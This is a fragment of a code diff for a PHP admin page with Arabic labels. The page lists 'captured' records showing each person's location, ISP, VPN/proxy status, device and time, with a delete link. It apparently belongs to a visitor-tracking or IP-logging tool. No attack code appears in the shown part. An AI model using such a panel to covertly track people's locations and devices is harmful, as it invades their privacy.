+                                <div class="info-row">
+                                    <span>Location:</span> <span style="color:#10b981;"><?php echo htmlspecialchars($cap['location']); ?></span>
+                                </div>
+                                <div class="info-row">
+                                    <span>المتعامل:</span> <span style="color:#f97316; font-weight: bold;"><?php echo htmlspecialchars($cap['isp_info']); ?></span>
+                                </div>
+                                <div class="info-row">
+                                    <span>VPN / Proxy:</span> 
+                                    <span style="color: <?php echo (strpos($cap['vpn_status'], 'Yes') !== false) ? '#f43f5e' : '#38bdf8'; ?>; font-weight: bold;">
+                                        <?php echo htmlspecialchars($cap['vpn_status']); ?>
+                                    </span>
+                                </div>
+                                <div class="info-row">
+                                    <span>Device:</span> <span><?php echo htmlspecialchars($cap['device_info']); ?></span>
+                                </div>
+                                <div class="info-row" style="border-top:1px solid var(--border-color); padding-top:6px; margin-top:8px;">
+                                    <span>Time:</span> <span><?php echo htmlspecialchars($cap['created_at']); ?></span>
+                                </div>
+                                
+                                <a href="?delete_id=<?php echo $cap['id']; ?>" class="btn-delete" onclick="return confirm('هل أنت متأكد من حذف هذا السجل؟');">حذف السجل</a>
+                            </div>
+                        <?php endforeach; ?>
+                    </div>
+                <?php endif; ?>
+            </div>
+        <?php endif; ?>
 
     </div>
 
     <footer>
-        <p>Core Engine <span>azeez</span> &copy; 2026</p>
+        <p>Developed by <span>azeez</span> &copy; 2026</p>
     </footer>
 </body>
 </html>
